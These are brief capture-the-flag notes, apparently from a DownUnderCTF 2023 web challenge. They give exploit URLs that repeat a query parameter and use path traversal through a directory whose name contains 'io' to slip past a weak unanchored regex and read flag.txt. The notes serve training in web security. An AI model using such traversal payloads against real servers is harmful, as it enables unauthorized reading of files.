`https://web-cgi-fridays-de834c0607c7.2023.ductf.dev/cgi-bin/route.pl?page=io&page=127.0.0.1`
+ Now just bypass the regex
/^stat|io|maps$/
+ Here io/../../../flag.txt didn't work as io isn't a directory
+ We need some directory which has io in it somewhere
`https://web-cgi-fridays-de834c0607c7.2023.ductf.dev/cgi-bin/route.pl?page=../../../../usr/share/doc/libio-html-perl/../../../../../flag.txt&page=127.0.0.1`
